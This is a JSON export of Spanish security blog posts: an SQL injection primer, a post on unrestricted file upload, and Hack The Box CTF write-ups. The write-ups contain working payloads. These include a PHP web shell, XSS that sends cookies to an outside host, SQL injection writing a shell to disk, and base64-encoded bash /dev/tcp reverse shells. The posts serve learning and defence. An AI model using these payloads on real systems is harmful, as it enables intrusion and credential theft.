        "tags": [
            "Hacking",
            "SQLInjection",
            "RepoExample",
            "Dummies",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/sql-injection-para-dummies/sqlinjection2.webp",
            "/static/images/uploads/sql-injection-para-dummies/sqli.svg",
            "/static/images/uploads/sql-injection-para-dummies/ezgif.com-gif-maker.webp"
        ],
        "draft": false,
        "summary": "En este post hablo sobre la técnica de SQL Injection, un tipo de ciberataque que se aprovecha de las vulnerabilidades de sistemas que utilizan bases de datos. Exploro cómo un hacker puede insertar código malicioso en un formulario y tener acceso a información protegida. También proporciono enlaces para prevenir estas vulnerabilidades en diferentes lenguajes de programación.",
        "content": "![](/static/images/uploads/sql-injection-para-dummies/sqlinjection2.webp)\n\nEn este post vamos a hablar de SQL Injection o inyección SQL, para los más hispanohablantes.\n\nAntes de nada, si estás muy perdido, vamos a explicar qué es SQL o Structured Query Language. SQL se utiliza para que, los desarrolladores de software en su mayoría, nos comuniquemos con las diferentes bases de datos dentro de nuestro código. Es un lenguaje estándar para sistemas de bases de datos relaciones. Te dejo un [link](https://es.wikipedia.org/wiki/SQL) a Wikipedia y otro a la web de [INCIBE](https://www.incibe.es/protege-tu-empresa/blog/ataques-inyeccion-sql-amenaza-tu-web) (Instituto Nacional de CIBErseguridad) por si tienes más curiosidad.\n\nDespués de esta breve introducción, al lío.\n\nCuando hablamos concretamente de las inyecciones SQL, estamos hablando de un tipo de ciberataque que se puede dar en cualquier plataforma digital que maneje por detrás una base de datos. Poneos a pensar y os daréis cuenta de que es más rápido si tratáis de enumerar qué sistema digital no se sustenta por detrás por una o más bases de datos y así podéis imaginar cuan sensible es este tema.\n\nAquellas potenciales plataformas que son sensibles a este tipo de ciberataque son aquellas (entre otras muchas) que manejan formularios y permiten introducir al usuario algún tipo de información. Si llegados a este punto te estás perdiendo, un formulario es lo que usas para meter tu usuario y contraseña de Netflix.\n\nY es que con esto, un hacker podría insertar código propio en una plataforma vulnerable y acceder a todo tipo de información protegida. Desde información relativa de los usuarios, hasta enumerar las distintas bases de datos que hay dentro de una organización.\n\nEn un mundo ideal, un usuario inserta una contraseña (1234) en un formulario de entrada. Pero, ¿que pasaría si un usuario introdujera lo siguiente en un servidor vulnerable?\n\n\n```\n |          | Login form         |\n |----------|--------------------|\n | Username | John               |\n | Password | 1234\" or 1=1;--    |\n```\nA continuación vemos un esquema del funcionamiento de un ataque de este estilo.\n\n![SQL Injection schema](/static/images/uploads/sql-injection-para-dummies/sqli.svg)\n\n\n Probar cualquier acción de este tipo en un entorno que no nos pertenece, está duramente penado por la ley. En ningún caso deberíamos probar esto en las plataformas. Incluso el [Hacking Ético](https://www.pandasecurity.com/es/mediacenter/seguridad/asi-se-estan-endureciendo-en-espana-las-penas-contra-los-ciberdelincuentes/), sin permiso de la empresa responsable de la plataforma, es ilegal.\n\n1. Un atacante inserta una contraseña. (1234\" or 1=1;--)\n2. Esa cadena de caracteres viaja al servidor y se sustituye dentro de la cláusula WHERE de la sentencia SQL.\n3. La sentencia WHERE hace de filtro. La idea es que devuelva aquellos usuarios que cumplen con la condición. En este caso, la condición booleana es verdadera en el operando derecho de la cláusula OR.\n4. Como siempre se cumple la condición, existe una fuga de información.\n\nHe preparado una prueba de concepto en mi [repositorio](https://github.com/iocio005/flask-sqlinjection-vulnerable) que puedes ejecutar con los siguientes comandos en un entorno con Docker instalado.\n\n\n```\ngit clone https://github.com/iocio005/flask-sqlinjection-vulnerable\ndocker-compose -f flask-sqlinjection-vulnerable/docker-compose.yml up\n```\nAbre un navegador, entra a http://127.0.0.1 y extrae toda la información que puedas, como se ve a continuación.\n\n![](/static/images/uploads/sql-injection-para-dummies/ezgif.com-gif-maker.webp)\n\nLa mayoría de las plataformas están exentas de este tipo de vulnerabilidades, aunque siempre aparecen casos nuevos que necesitan ser parcheados.\n\nSi eres desarrollador y quieres asegurarte de que en tu código no introduces este tipo de vulnerabilidades, probablemente estés exento de ellas si utilizas algún ORM o Framework. En cualquier caso, investiga los siguientes enlaces con el fin de prevenir estas vulnerabilidades en diferentes lenguajes:\n\n* [C#](https://letmegooglethat.com/?q=How+to+prevent+sqli+csharp)\n* [Python](https://letmegooglethat.com/?q=How+to+prevent+sqli+python)\n* [Java](https://letmegooglethat.com/?q=How+to+prevent+sqli+java)\n* [Php](https://letmegooglethat.com/?q=How+to+prevent+sqli+php)\n"
    },
    {
        "title": "CTF - NodeBlog WriteUP",
        "slug": "ctf-nodeblog-writeup",
        "date": "2022-02-01",
        "tags": [
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/ctf-nodeblog-writeup/Screenshot_1.webp",
            "/static/images/uploads/ctf-nodeblog-writeup/Screenshot_2.webp",
            "/static/images/uploads/ctf-nodeblog-writeup/Screenshot_4.webp",
            "/static/images/uploads/ctf-nodeblog-writeup/Screenshot_5.webp"
        ],
        "draft": true,
        "summary": "Resumen: Reto CTF que consiste en encontrar vulnerabilidades en una máquina CTF de Capture The Flag. Se exploran puertos, se intentan inyecciones SQL y se descubre una vulnerabilidad de XML External Entity que permite ejecutar código. Se logra obtener acceso de root y se obtienen las flags.",
        "content": "![](/static/images/uploads/ctf-nodeblog-writeup/Screenshot_1.webp)\n\nnmap me cuesta descubrir cosas. He tenido que ralentizar el comando de descubrir todos los pueortos porque no me encontraba ninguno más que el 22, A si que lo he lanzado normal\n\n\n```\nnmap -p- --open -sT -vvv -n -Pn 10.10.11.139 -oG allPorts\n```\ny despues\n\n\n```\nnmap -p22,5000 -sCV -n -Pn -vvv 10.10.11.139 -oN targeted\n# Scanned at 2022-02-01 20:20:50 CET for 15s\n# PORT     STATE SERVICE REASON         VERSION\n# 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n# | ssh-hostkey: \n# |   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)\n# | ssh-rsa\n# |   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)\n# | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZPKXFj3JfSmJZFAHDyqUDFHLHBRBRvlesLRVAqq0WwRFbeYdKwVIVv0DBufhYXHHcUSsBRw3/on9QM24kymD0=\n# |   256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)\n# |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEDIBMvrXLaYc6DXKPZaypaAv4yZ3DNLe1YaBpbpB8aY\n# 5000/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)\n# |_http-title: Blog\n# | http-methods: \n# |_  Supported Methods: GET HEAD POST OPTIONS\n# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\nFoto\n\n![](/static/images/uploads/ctf-nodeblog-writeup/Screenshot\\_2.webp)\n\nTiene un login.\n\nProbamos sqlmap y no tiene inyecciones sql.\n\n\n```\n❯ curl -X POST nodeblog.htb:5000/login -H \"Content-Type: application/json\" -d \"this is not a json\"\n\n\n\n\n\nError\n\n\n\n```\nSyntaxError: Unexpected token t in JSON at position 0  \n &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)  \n &nbsp; &nbsp;at createStrictSyntaxError (/opt/blog/node_modules/body-parser/lib/types/json.js:158:10)  \n &nbsp; &nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:83:15)  \n &nbsp; &nbsp;at /opt/blog/node_modules/body-parser/lib/read.js:121:18  \n &nbsp; &nbsp;at invokeCallback (/opt/blog/node_modules/raw-body/index.js:224:16)  \n &nbsp; &nbsp;at done (/opt/blog/node_modules/raw-body/index.js:213:7)  \n &nbsp; &nbsp;at IncomingMessage.onEnd (/opt/blog/node_modules/raw-body/index.js:273:7)  \n &nbsp; &nbsp;at IncomingMessage.emit (events.js:412:35)  \n &nbsp; &nbsp;at endReadableNT (internal/streams/readable.js:1334:12)  \n &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:82:21)\n```\n\n\n\n\n```\nEsta intentando parsear json. nosql injection?\n\n\n```\n❯ curl -X POST nodeblog.htb:5000/login -H \"Content-Type: application/json\" -d \"{\\\"user\\\":,\\\"password\\\":{\\\"\\$gt\\\":\\\"\\\"}}\"\n# funciona\n```\nCon burpsuite/repeater prueblo a hacer la llamada y mando al navegador la sesion iniciada\n\nfotos de burpsuite y el boton upload\n\nSubo un archivo normal y me sale esto si veo el html\n\n\n```\nInvalid XML Example: \n\n Example Post\n Example Description\n Example Markdown\n\n```\nVeo que se pueden escribir articulos con \n\n* title\n* description\n* markdown\n\nMe genero un xml \n\n\n```\n\nhola\naaa\nmd\n\n```\nY me lleva a la ventana de articulo con todo relleno.\n\nEncuentro informacion sobre una vulnerabilidad de XML External entity (https://hackmd.io/@Chivato/rkSqk9gbL) y veo que se puede ejecutar codigo\n\n\n```\nxml version=\"1.0\" encoding=\"ISO-8859-1\"? \n ]\n\nhola\naaa\n&xxe;\n\n```\n![](/static/images/uploads/ctf-nodeblog-writeup/Screenshot\\_4.webp)\n\nEs vulnerable. Modifico el script para probar otras cosas.\n\nMe acuerdo de que cuando me daba el error de json, me daba una ruta donde estaba la app /opt/blog\n\nEncuentro que un archivo tipico de nodejs es el server.js e imprimo su contenido /opt/blog/server.js\n\nVeo que usa node-serializer [https://snyk.io/test/npm/node-serialize#:~:text=node-serialize serializes an object,into the unserialize() function](https://snyk.io/test/npm/node-serialize#:~:text=node%2Dserialize%20serializes%20an%20object,into%20the%20unserialize()%20function).\n\nEn server.js veo que el serializador parsea la cookie y la vulnerabilidad esta en que en la cookie puedes poner codigo que ejecuta el programa.\n\ncon burpsuite hago pruebas y veo que a veces ejecuta codigo y a veces no. Como hay serializaciones y demas, escribo el codigo en base64 intentando que no haya ni '+' ni '=' poniendo espacios.\n\n\n```\n❯ echo -n \"bash -i & /dev/tcp/10.10.14.9/443 0&1\" | base64\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0MyAwPiYx\n❯ echo -n \"bash -i  & /dev/tcp/10.10.14.9/443 0&1\" | base64\nYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgMD4mMQ==\n❯ echo -n \"bash -i  & /dev/tcp/10.10.14.9/443  0&1\" | base64\nYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgIDA+JjE=\n❯ echo -n \"bash -i  &  /dev/tcp/10.10.14.9/443  0&1\" | base64\nYmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx\n\n# Copio el siguiente código en la cookie de burpsuite\n# echo -n YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx | base64 -d | bash\n```\n![](/static/images/uploads/ctf-nodeblog-writeup/Screenshot\\_5.webp)\n\nAntes de enviarlo, codifico el contenido de auth= a URLEncoding\n\nMe pongo en esuccha en mi equipo con netcat y estoy dentro.\n\nEntramos a mongodb y buscamos informacion del usuario\n\n\n```\n❯ admin@nodeblog:/opt/blog$ mongo 127.0.0.1\n❯ show databases\nadmin   0.000GB\nblog    0.000GB\nconfig  0.000GB\nlocal   0.000GB\n❯ use blog\nswitched to db blog\n❯ show collections\narticles\nusers\n❯ db.users.find()\n{ \"_id\" : ObjectId(\"61b7380ae5814df6030d2373\"), \"createdAt\" : ISODate(\"2021-12-13T12:09:46.009Z\"), \"username\" : \"admin\", \"password\" : \"IppsecSaysPleaseSubscribe\", \"__v\" : 0 }\n```\nTenemos la contraseña. Vamos a probar a ejecutar \n\n\n```\n❯admin@nodeblog:/opt/blog$ sudo su -\n[sudo] password for admin: \n❯ root@nodeblog:~# whoami\nroot\n❯ root@nodeblog:~# cat /home/admin/user.txt\ne83b0edb016a7146e2e5aa00f4416730\n❯ root@nodeblog:~# cat root.txt\nb38f827567b54906d52439592c719952\n```\n"
    },
    {
        "title": "Por qué permitir subir archivos a tu web es peligroso",
        "slug": "permitir-subir-archivos-a-tu-web-es-peligroso",
        "date": "2022-02-06",
        "tags": [
            "UnrestrictedFileUpload",
            "Hacking",
            "Vulnerabilities",
            "Pentesting",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/permitir-subir-archivos-a-tu-web-es-peligroso/Screenshot_6.webp",
            "/static/images/uploads/permitir-subir-archivos-a-tu-web-es-peligroso/ezgif-5-1b4b7d19e3-4.webp"
        ],
        "draft": false,
        "summary": "En este post hablaré sobre los riesgos de permitir la subida de archivos en plataformas web. Enumeraré las vulnerabilidades que pueden aprovecharse, como la ejecución de código remoto en el cliente o en el servidor. Explicaré una prueba de concepto y daré consejos para prevenir estos ataques.",
        "content": "![](/static/images/uploads/permitir-subir-archivos-a-tu-web-es-peligroso/Screenshot_6.webp)\n\nEl post de hoy va a tratar sobre el riesgo potencial que se crea en aquellas plataformas que permiten a los usuarios subir archivos a través de algún formulario.\n\nEste tipo de plataformas van más allá que Facebook o Instagram, donde todos tenemos claro que se pueden subir fotos. También estamos hablando de cualquier web que te permite subir una imagen de perfil, por ejemplo. Y esto último abarca un gran número de webs.\n\nEl impacto de una vulnerabilidad de este tipo está catalogado como riesgo alto por la [OWASP](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) (Open Web Application Security Project) foundation, el organismo encargado de apoyar, gestionar y determinar las causas que hacen que el software sea inseguro.\n\nPero analicemos más en profundidad qué riesgos puede ocasionarnos una vulnerabilidad de este tipo. A continuación, enumeraré los 2 más los más interesantes a mi parecer:\n\n1. Ejecución de código remoto en el contexto del cliente, pudiendo robar la cookie de sesión del usuario que accede a ese contenido.\n2. Ejecución de código remoto en el contexto del servidor (subiendo un archivo en el lenguaje que interprete el servidor).\n\nDe este último, he preparado una prueba de concepto que servirá para entender mejor el problema al que nos enfrentamos.\n\n## Unrestricted File Upload Vulnerability\n\nEl código de la prueba se puede descargar del siguiente [link](https://github.com/iocio005/Unrestricted-File-Upload-Vulnerability). Como siempre, se puede poner en marcha del siguiente modo.\n\n\n```\ngit clone https://github.com/iocio005/Unrestricted-File-Upload-Vulnerability\ncd Unrestricted-File-Upload-Vulnerability\ndocker-compose up\n```\n**Analicemos lo que ocurre a continuación**. \n\nEstamos ante una aplicación que permite subir imágenes para visualizarlas online, como si se tratase de un álbum de fotos. Esta aplicación se ejecuta en un servidor que interpreta código PHP. Un atacante no tiene por qué conocer esta información, pero es relativamente fácil llegar a esta conclusión analizando el host remoto con una serie de herramientas o incluso, conociendo el CMS que está corriendo.\n\n![](/static/images/uploads/permitir-subir-archivos-a-tu-web-es-peligroso/ezgif-5-1b4b7d19e3-4.webp)\n\nEl ataque consta de 3 pasos:\n\n1. Preparamos un archivo PHP que contiene el siguiente código.\n\n\n```\nphp\n\techo system($_REQUEST['cmd']);\n?\n```\n*Es gracioso porque Windows me borraba automáticamente el archivo cuando lo estaba creando para hacer la prueba.*\n\nEste código recibe un parámetro *cmd* que ejecutará en una consola del sistema y después imprimirá por pantalla el resultado.\n\n2. Utilizamos el formulario para subir el archivo, ya que el servidor no tiene en cuenta la extensión del mismo. En la web, se generan unos links para acceder a la visualización del contenido.\n\n3. Como el servidor interpreta el código PHP que hemos introducido, le añadimos un parámetro a la URL que ejecutará el comando que queramos del siguiente modo.\n\n\n```\nhttp://127.0.0.1/php_rce.php?cmd=\n```\nLlegados a este punto, ya hemos obtenido la ejecución remota de código. A partir de este momento podemos enumerar archivos del sistema o simplemente ejecutarnos una shell reversa para navegar por el sistema de archivos.\n\n**Cosas a tener en consideración:**\n\n* Si el servidor se estuviese ejecutando como *root*, tanto los comandos como la shell que obtendríamos estaría en una sesión con todos los privilegios. Game Over. De ahí la importancia de tener un control de privilegios de las tareas que estamos ejecutando.\n* Si el servidor estuviese filtrando este tipo de archivos y solo permitiese subir imágenes, pero el backend estuviese empleando alguna librería típica de procesamiento de imágenes como [ImageTragick](https://imagetragick.com/), el servidor sería igualmente vulnerable.\n* Esta explotación de la vulnerabilidad es un caso extremo. No limitar el tamaño del archivo que se sube al servidor podría terminar en un ataque [DOS](https://www.cloudflare.com/es-es/learning/ddos/what-is-a-ddos-attack/) al llenar el almacenamiento total del sistema en caso de no estar alojando los archivos en un almacenamiento de datos Cloud como [S3](https://aws.amazon.com/es/s3/). En este último caso, tu economía podría irse al garete.\n* Cualquier lenguaje backend es susceptible de sufrir esta vulnerabilidad. La prueba de concepto con PHP se podría haber hecho con .NET, Java, Javascript, Python y un largo etc.\n\n## Y, ¿qué puedo hacer para prevenir esto?\n\nSon varias las cosas que deberías tener en cuenta como ves en este [link](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html), pero los siguientes puntos deberían ser básicos para tu servidor:\n\n* El atributo Accept en el html del lado de [cliente](https://developer.mozilla.org/es/docs/Web/HTML/Attributes/accept). Ojo, esto por si solamente no sirve de nada, debe ir acompañado obligatoriamente del siguiente punto.\n* Valida el tipo de archivo en el servidor. No te fíes únicamente de la cabecera Content-Type, un usuario podría modificar esto. En el siguiente [enlace](https://dev.to/einlinuus/how-to-upload-files-with-php-correctly-and-securely-1kng) tienes un ejemplo de como se haría en PHP, pero básicamente consiste en leer el [MimeType](https://developer.mozilla.org/es/docs/Web/HTTP/Basics_of_HTTP/MIME_types) del archivo y mediante una [Whitelist](https://www.hypr.com/whitelist/), permitir unas extensiones concretas excluyendo automáticamente todas las demás.\n* Fija un tamaño límite del archivo. Si es posible, aplica algún tipo de umbral máximo de subida de archivo por cada usuario. No permitas subir archivos sin estar autenticado.\n* Almacena los archivos en un lugar externo al servidor que corre la aplicación. En caso de no ser posible, ubica la carpeta de subidas fuera del directorio webroot.\n* Utiliza identificadores que se mapeen con cada archivo. Es decir, en el caso de la aplicación de prueba, la forma de acceder al archivo subido no debería ser http://127.0.0.1/php\\_rce.php, debería ser mediante una URI aleatoria tipo http://127.0.0.1/123456789.\n* Protege todos tus formularios de posibles ataques [CSRF](https://owasp.org/www-community/attacks/csrf).\n"
    },
    {
        "title": "CTF - Validation WriteUp",
        "slug": "ctf-validation",
        "date": "2022-02-08",
        "tags": [
            "CTF",
            "Hacking",
            "SQLInjection",
            "XSS",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/ctf-validation/validation.webp",
            "/static/images/uploads/ctf-validation/form.webp",
            "/static/images/uploads/ctf-validation/xss.webp"
        ],
        "draft": false,
        "summary": "Reto CTF que consiste en encontrar vulnerabilidades en una máquina virtual. Se detectan puertos abiertos y se encuentra un formulario vulnerable a XSS y una inyección SQL. Se obtiene acceso y se enumeran las flags.",
        "content": "![](/static/images/uploads/ctf-validation/validation.webp)\n\nEsta máquina es del creador de contenido de Ciberseguridad [IppSec](https://www.youtube.com/c/ippsec/videos). Podemos encontrar varias máquinas suyas en HTB y suelen ser todas bastante entretenidas.\n\nEn este caso empezamos con el escaneo de puertos.\n\n\n```\nnmap -p- -sS --open -T5 -vvv -n -Pn -oG allPorts 10.10.11.116\n```\nEn mi caso, el parámetro --min-rate 5000 no me funciona bien. Seguramente tenga algo que ver la máquina virtual que utilizo, por lo que utilizo -T5 que es el modo loco de NMAP para ir tan rápido como pueda.\n\nDescubrimos varios puertos abiertos.\n\n\n```\n❯ nmap -p22,80,4566,8080 -sCV -n -Pn 10.10.11.116 -oN targeted\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)\n|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)\n|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)\n80/tcp   open  http    Apache httpd 2.4.48 ((Debian))\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: Apache/2.4.48 (Debian)\n4566/tcp open  http    nginx\n|_http-title: 403 Forbidden\n8080/tcp open  http    nginx\n|_http-title: 502 Bad Gateway\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\nEl puerto 8080 devuelve un http status code 502 y el 4566 un 403 forbidden, por lo que nos centramos en el puerto 80.\n\nEn la página principal aparece un formulario donde podemos introducir un nombre y elegir un país.\n\n![](/static/images/uploads/ctf-validation/form.webp)\n\nParece que al rellenarlo, nos lleva a otra página con la información registrada. Probamos una inyección XSS en el campo *Username* y avanzamos.\n\n\n```\nalert(\"XSS attack\");\n```\nPulsamos al botón de Join Now y encontramos lo siguiente.\n\n![](/static/images/uploads/ctf-validation/xss.webp)\n\nUna vez que validamos que es vulnerable a ataques XSS, busco el siguiente código en el cheatsheet de [R0B1NL1N](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md).\n\n\n```\nvar i=new Image;i.src=\"http://10.10.14.14:8080/?\"+document.cookie;\n```\nY tras poner en escucha en nuestro equipo un servidor en el puerto 8080, recibo la siguiente petición. Lo que se ve a continuación soy yo entrando a la página y enviándome mi cookie de sesión *user=020fba18d39d4e3bbda3fa8396dd4563*. De esta forma verifico que todo funciona correctamente.\n\n\n```\n❯ python -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n10.10.14.14 - - [08/Feb/2022 18:39:45] \"GET /?user=020fba18d39d4e3bbda3fa8396dd4563 HTTP/1.1\" 200 -\n```\nLlegados a este punto cualquier usuario que entre a esa página, nos estará enviando su cookie de sesión. Continúo buscando cosas mientras dejo el servidor corriendo aunque ya os adelanto que por ese camino, no voy a conseguir nada más.\n\nRetomando los pasos previos, intento ver si el formulario es vulnerable a injecciones SQL y veo que el input del país es vulnerable.\n\nMonto Burpsuite, activo el proxy en mi navegador y modifico los parámetros de la petición /POST de la siguiente manera.\n\n\n```\nusername=anyuser&country='union select \"php system($_REQUEST['cmd']); ?\" INTO OUTFILE \"/var/www/html/shell.php\"-- -\n```\nMe pongo en escucha con Netcat en mi máquina en el puerto 443 y realizo una petición a la siguiente URL.\n\n\n```\nhttp://10.10.11.116/shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F443%200%3E%261%0A\n```\nLa URL está codificada. El contenido de cmd es bash -i & /dev/tcp/10.10.14.14/443 0&1.\n\nRecibo la shell y lo primero que hago es ver la siguiente configuración en el directorio actual.\n\n\n```\nwww-data@validation:/var/www/html$ cat config.php\nphp\n  $servername = \"127.0.0.1\";\n  $username = \"uhc\";\n  $password = \"uhc-9qual-global-pw\";\n  $dbname = \"registration\";\n\n  $conn = new mysqli($servername, $username, $password, $dbname);\n?\n```\nVeo las credenciales de MySQL. Podría tratar de enumerar el contenido de la base de datos, pero pruebo por casualidad si soy capaz de ponerme como sudo con la misma contraseña.\n\n\n```\nwww-data@validation: su -\nuhc-9qual-global-pw\nroot@validation:~#\n```\nLlegados a este punto, tenemos acceso a todo el contenido. Enumero las flags y listo.\n\n\n```\nroot@validation:~# cat /home/htb/user.txt\ne4be632da67c582f555571fdfa8135d6\nroot@validation:~# cat root.txt\n459129eac316e8f9a522758f2a362493\n```\n"
    },
    {
        "title": "CTF - Horizontall WriteUp",
        "slug": "ctf-horizontall",
        "date": "2022-02-09",
        "tags": [
            "CTF",
            "Hacking",
            "VueJS",
            "Fuzzing",
            "Rce",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/ctf-horizontall/Screenshot_1-1.webp",
            "/static/images/uploads/ctf-horizontall/image.webp",
            "/static/images/uploads/ctf-horizontall/Screenshot_2-1.webp",
            "/static/images/uploads/ctf-horizontall/image-3.webp",
            "/static/images/uploads/ctf-horizontall/image-5.webp",
            "/static/images/uploads/ctf-horizontall/image-6.webp"
        ],
        "draft": false,
        "summary": "Resumen del texto: \n\nEn este reto CTF se escanean todos los puertos disponibles con NMAP y se encuentran los puertos 80 y 22 abiertos. Al acceder a una URL, se descubre una SPA de VueJS. Mediante el uso de herramientas de desarrollo, se encuentran archivos Vue que llaman a una API. Se descubre un subdominio interesante y se realiza fuzzing contra él. Se encuentra una ruta de administración de Strapi y se explota una vulnerabilidad para resetear la contraseña de un usuario válido. Se ejecuta un script de RCE y se obtiene una reverse shell. Se escala privilegios en la máquina y se encuentra un puerto oculto en el localhost. Se utiliza un exploit de Laravel para obtener una reverse shell como usuario root. Se obtiene la flag del sistema.",
        "content": "![](/static/images/uploads/ctf-horizontall/Screenshot_1-1.webp)\n\nHago un escaneo de puertos todos los puertos disponibles con NMAP.\n\n\n```\nnmap -p- -sS -T5 --open -vvv 10.10.11.105 -oG allPorts\n```\nMe devuelve los puertos 80 y 22 como abiertos y abro en un navegador la siguiente url http://10.10.11.105.\n\n![](/static/images/uploads/ctf-horizontall/image.webp)\n\nPercibo que me encuentro ante una SPA hecha en VueJS. En un inicio, el código fuente de la web está oculto puesto que se carga posteriormente cuando el navegador interpreta Javascript. Utilizando el devtools de Firefox, encuentro los archivos Vue que llaman a la API para recuperar la información.\n\n![](/static/images/uploads/ctf-horizontall/Screenshot\\_2-1.webp)\n\nEl subdominio que aparece reflejado lo introduzco en mi /etc/hosts con el fin de poder resolver dicha dirección en caso de encontrarme con un virtual hosting.\n\n\n```\n❯ cat /etc/hosts\n───────┬─────────────────────────────────────────────────────────────────────\n       │ File: /etc/hosts\n───────┼─────────────────────────────────────────────────────────────────────\n   1   │ # Host addresses\n   2   │ 127.0.0.1  localhost\n   3   │ 127.0.1.1  iocio-virtualbox\n   4   │ ::1        localhost ip6-localhost ip6-loopback\n   5   │ ff02::1    ip6-allnodes\n   6   │ ff02::2    ip6-allrouters\n   7   │ \n   8   │ 10.10.11.105    horizontall.htb www.horizontall.htb api-prod.horizontall.htb\n```\nRealizo fuzzing contra el dominio api-prod.horizontall.htb.\n\n\n```\n wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \"http://api-prod.horizontall.htb/FUZZ\"\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\nTarget: http://api-prod.horizontall.htb/FUZZ\nTotal requests: 141708\n=====================================================================\nID           Response   Lines    Word       Chars       Payload               \n=====================================================================    \n000000014:   200        19 L     33 W       413 Ch      \"http://api-prod.horizontall.htb/\"\n000000350:   200        0 L      21 W       507 Ch      \"reviews\"             \n000001895:   200        16 L     101 W      854 Ch      \"admin\"               \n```\nEncuentro una ruta interesante en /admin. En ella, aparece un formulario de login de una plataforma denominada Strapi.\n\n![](/static/images/uploads/ctf-horizontall/image-3.webp)\n\nBuscando un poco encuentro la siguiente [vulnerabilidad](https://www.exploit-db.com/exploits/50237) que nos permite resetear la contraseña del usuario. Analizando el script, veo que accediendo a la ruta http://api-prod.horizontall.htb/admin/strapiVersion puedo ver la versión del CMS que está detrás. Eso me sirve para confirmar que la versión *3.0.0-beta.17.4* es vulnerable. Aun así, necesito un usuario válido para poder emplear el script.\n\nSi rellenamos el formulario de \"olvidó su contraseña\", observamos que hay una fuga de información que no debería existir. **Este tipo de formularios no deberían dar pistas sobre que usuarios existen o cuáles no.**\n\n![](/static/images/uploads/ctf-horizontall/image-5.webp)\n\nProbamos con admin@horizontall.htb y vemos que no pone nada, por lo que asumimos que ese usuario **SI** existe.\n\nAñadimos en el script los campos acordes a nuestro entorno y ejecutamos.\n\n\n```\n❯ python3 password.py\n[*] strapi version: 3.0.0-beta.17.4\n[*] Password reset for user: admin@horizontall.htb\n[*] Setting new password\n[+] New password 'admin' set for user admin@horizontall.htb\n```\nDe esta forma, hemos modificado la contraseña y podemos ejecutar otro tipo de vulnerabilidades que requieren de autenticación previa. Podemos encontrar una vulnerabilidad de ese tipo [aquí](https://www.exploit-db.com/exploits/50239). Nos ponemos en escucha en el puerto 443 con netcat. \n\n\n```\nnc -lvp 443\n```\nModificamos el script para adaptarlo a nuestras necesidades y ejecutamos.\n\n\n```\npython3 rce.py http://api-prod.horizontall.htb\n[+] Checking Strapi CMS Version running\n[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n$ bash -c 'bash -i & /dev/tcp/10.10.14.15/443 0&1'\n```\nDe esta manera, en la consola de netcat, recibimos una reverse shell con la que podemos empezar a escalar privilegios.\n\n\n```\nstrapi@horizontall:~$ whoami\nstrapi\nstrapi@horizontall:~$ id\nuid=1001(strapi) gid=1001(strapi) groups=1001(strapi)\n```\nVerifico que puertos hay abiertos en el localhost  de la máquina por si hubiese algún servicio oculto ejecutandose.\n\n\n```\nstrapi@horizontall:~$ netstat -tulpn\nProto Recv-Q Send-Q Local Address           Foreign Address         State    \ntcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN  \n...\n```\nCon un curl, vemos que es una CMS de Laravel. Creamos una clave ssh para poder conectarnos a la máquina estableciendo un túnel entre mi máquina y la máquina vulnerable con tal de poder ver ese puerto oculto en su localhost.\n\n\n```\nssh -L 80:127.0.0.1:8000 -i strapi_id_rsa strapi@10.10.11.105\n```\n![](/static/images/uploads/ctf-horizontall/image-6.webp)\n\nNavegando un poco, encontramos un [exploit](https://www.exploit-db.com/exploits/49424) de la versión de Laravel que está siendo ejecutada en la máquina. Comprobamos que funciona con un 'whoami'.\n\n\n```\npython3 laravel.py http://127.0.0.1:80 /home/developer/myproject/storage/logs/laravel.log 'whoami'\nExploit...\nroot\n```\nUna vez verificado, nos ponemos en escucha con netcat.\n\n\n```\nnc -lvp 443\n```\nY nos mandamos una reverse shell con netcat versión 